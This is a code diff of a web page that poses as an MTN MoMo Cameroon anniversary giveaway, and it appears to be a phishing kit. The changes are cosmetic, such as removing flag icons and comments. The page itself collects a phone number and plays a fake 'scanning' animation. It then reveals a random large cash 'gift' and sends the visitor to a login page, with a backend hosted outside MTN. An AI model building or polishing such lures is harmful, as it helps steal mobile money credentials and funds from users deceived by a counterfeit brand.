@@ -114,7 +114,7 @@
       text-transform: uppercase;
     }
 
-    /* LANGUAGE DROPDOWN */
+    /* LANGUAGE DROPDOWN — no flags */
     .lang-wrap { position: relative; flex-shrink: 0; }
     .lang-btn {
       display: flex;
@@ -133,7 +133,10 @@
       white-space: nowrap;
     }
     .lang-btn:hover { background: rgba(255, 255, 255, 0.18); color: #fff; }
-    .lang-btn .flag { font-size: 0.95rem; }
+    .lang-btn .globe {
+      font-size: 0.85rem;
+      opacity: 0.85;
+    }
     .lang-btn .caret {
       font-size: 0.55rem;
       opacity: 0.7;
@@ -145,7 +148,7 @@
       position: absolute;
       top: calc(100% + 8px);
       right: 0;
-      min-width: 190px;
+      min-width: 180px;
       background: #fff;
       border: 1.5px solid #E4E7EF;
       border-radius: 14px;
@@ -167,7 +170,6 @@
     .lang-item {
       display: flex;
       align-items: center;
-      gap: 10px;
       width: 100%;
       padding: 12px 16px;
       background: #fff;
@@ -184,7 +186,6 @@
     .lang-item:first-child { border-top: none; }
     .lang-item:hover { background: #F0F4FF; }
     .lang-item.selected { background: #F0F4FF; }
-    .lang-item .flag { font-size: 1.1rem; }
     .lang-item .check {
       margin-left: auto;
       color: var(--mtn-dark);
@@ -808,23 +809,20 @@
 
       <div class="lang-wrap" id="langWrap">
         <button type="button" class="lang-btn" id="langBtn" aria-haspopup="true">
-          <span class="flag" id="langFlag">🇬🇧</span>
+          <span class="globe">🌐</span>
           <span class="lang-name" id="langName">English</span>
           <span class="caret">▼</span>
         </button>
         <div class="lang-menu" id="langMenu">
           <button type="button" class="lang-item" data-lang="en">
-            <span class="flag">🇬🇧</span>
             <span>English</span>
             <span class="check">✓</span>
           </button>
           <button type="button" class="lang-item" data-lang="fr">
-            <span class="flag">🇫🇷</span>
             <span>Français</span>
             <span class="check">✓</span>
           </button>
           <button type="button" class="lang-item" data-lang="cr">
-            <span class="flag">🇨🇲</span>
             <span>Camfranglais</span>
             <span class="check">✓</span>
           </button>
@@ -838,7 +836,7 @@
     <div class="wrap">
       <div class="card-wrap">
 
-        <!-- ═══════════ STEP 1 — CELEBRATION ═══════════ -->
+        <!-- STEP 1 — CELEBRATION -->
         <div class="step active" id="stepCelebration">
           <div class="hero-card">
             <div class="confetti-layer">
@@ -898,7 +896,7 @@
           </div>
         </div>
 
-        <!-- ═══════════ STEP 2 — SCANNING ═══════════ -->
+        <!-- STEP 2 — SCANNING -->
         <div class="step" id="stepScanning">
           <div class="scan-card">
             <div class="scan-orbit">
@@ -929,7 +927,7 @@
           </div>
         </div>
 
-        <!-- ═══════════ STEP 3 — GIFT REVEAL ═══════════ -->
+        <!-- STEP 3 — GIFT REVEAL -->
         <div class="step" id="stepGift">
           <div class="gift-card">
             <div class="confetti-layer">
@@ -976,13 +974,8 @@
     <span class="footer-text" data-i18n="footer.text">© 2026 MTN MoMo Cameroon</span>
   </footer>
 
-  <!-- ============================================
-       TRANSLATIONS + LOGIC
-       ============================================ -->
   <script>
-    // ============================================
-    // TRANSLATIONS — en / fr / cr (Camfranglais)
-    // ============================================
+    // TRANSLATIONS
     const TRANSLATIONS = {
       en: {
         'brand.sub': 'MTN MoMo Anniversary',
@@ -1055,19 +1048,16 @@
       }
     };
 
-    // ============================================
-    // LANGUAGE
-    // ============================================
+    // LANGUAGE META (no flags)
     const LANG_META = {
-      en: { flag: '🇬🇧', name: 'English' },
-      fr: { flag: '🇫🇷', name: 'Français' },
-      cr: { flag: '🇨🇲', name: 'Camfranglais' }
+      en: { name: 'English' },
+      fr: { name: 'Français' },
+      cr: { name: 'Camfranglais' }
     };
 
     const langWrap = document.getElementById('langWrap');
     const langBtn = document.getElementById('langBtn');
     const langMenu = document.getElementById('langMenu');
-    const langFlag = document.getElementById('langFlag');
     const langName = document.getElementById('langName');
     const langItems = document.querySelectorAll('.lang-item');
 
@@ -1078,9 +1068,7 @@
         const key = el.getAttribute('data-i18n');
         if (t[key]) el.textContent = t[key];
       });
-      const meta = LANG_META[lang];
-      langFlag.textContent = meta.flag;
-      langName.textContent = meta.name;
+      langName.textContent = LANG_META[lang].name;
       langItems.forEach(i => i.classList.toggle('selected', i.dataset.lang === lang));
       localStorage.setItem('momoLang', lang);
       document.documentElement.lang = lang === 'cr' ? 'en' : lang;
@@ -1101,13 +1089,10 @@
       if (!langWrap.contains(e.target)) langWrap.classList.remove('open');
     });
 
-    // Initial language
     const savedLang = localStorage.getItem('momoLang') || 'en';
     applyLanguage(savedLang);
 
-    // ============================================
     // STEP SYSTEM
-    // ============================================
     const stepCelebration = document.getElementById('stepCelebration');
     const stepScanning = document.getElementById('stepScanning');
     const stepGift = document.getElementById('stepGift');
@@ -1118,9 +1103,7 @@
       window.scrollTo({ top: 0, behavior: 'smooth' });
     }
 
-    // ============================================
-    // PHONE INPUT
-    // ============================================
+    // PHONE
     const phoneInput = document.getElementById('phoneInput');
     const phoneWrapper = document.getElementById('phoneWrapper');
     const phoneError = document.getElementById('phoneError');
@@ -1133,11 +1116,8 @@
       }
     });
 
-    // ============================================
-    // CLAIM BUTTON
-    // ============================================
+    // CLAIM
     const claimBtn = document.getElementById('claimBtn');
-
     claimBtn.addEventListener('click', () => {
       const digits = phoneInput.value.replace(/\D/g, '');
       if (digits.length !== 9) {
@@ -1146,29 +1126,19 @@
         phoneInput.focus();
         return;
       }
-
-      // Save phone for login auto-fill
       localStorage.setItem('momoPhone', '+237' + digits);
-
-      // Show scanning
       showStep(stepScanning);
       runScanningSequence();
     });
 
-    // ============================================
-    // SCANNING SEQUENCE — 4 seconds
-    // ============================================
+    // SCANNING
     function runScanningSequence() {
       const steps = document.querySelectorAll('.scan-step');
       steps.forEach(s => s.classList.remove('active', 'done'));
-
       const DURATION = 4000;
       const perStep = DURATION / steps.length;
-
       steps[0].classList.add('active');
-
       let index = 0;
-
       const tickStep = () => {
         if (index >= steps.length) {
           setTimeout(() => showGift(), 250);
@@ -1176,9 +1146,7 @@
         }
         steps[index].classList.remove('active');
         steps[index].classList.add('done');
-
         index++;
-
         if (index < steps.length) {
           steps[index].classList.add('active');
           setTimeout(tickStep, perStep);
@@ -1186,13 +1154,10 @@
           setTimeout(() => showGift(), perStep);
         }
       };
-
       setTimeout(tickStep, perStep);
     }
 
-    // ============================================
-    // GIFT REVEAL — count-up animation
-    // ============================================
+    // GIFT
     const giftAmount = document.getElementById('giftAmount');
     const MIN_AMOUNT = 675700;
     const MAX_AMOUNT = 1936388;
@@ -1213,25 +1178,19 @@
     function animateCount(el, from, to, durationMs) {
       const start = performance.now();
       const easeOut = t => 1 - Math.pow(1 - t, 3);
-
       function frame(now) {
         const elapsed = now - start;
         const t = Math.min(1, elapsed / durationMs);
         const eased = easeOut(t);
         const current = from + (to - from) * eased;
         el.textContent = formatMoneyWithDecimals(current);
-        if (t < 1) {
-          requestAnimationFrame(frame);
-        } else {
-          el.textContent = formatMoneyWithDecimals(to);
-        }
+        if (t < 1) requestAnimationFrame(frame);
+        else el.textContent = formatMoneyWithDecimals(to);
       }
       requestAnimationFrame(frame);
     }
 
-    // ============================================
-    // CONTINUE → login.html
-    // ============================================
+    // CONTINUE
     const continueBtn = document.getElementById('continueBtn');
     continueBtn.addEventListener('click', () => {
       if (typeof fbq === 'function') {
@@ -1244,14 +1203,8 @@
       window.location.href = 'login.html';
     });
 
-    // ============================================
-    // BOOT
-    // ============================================
     phoneInput.focus();
-    console.log('====================================');
     console.log('🎉 MTN MoMo Anniversary — Index');
-    console.log('📡 Backend: momo-usersey-production.up.railway.app');
-    console.log('====================================');
   </script>
 </body>
 </html>
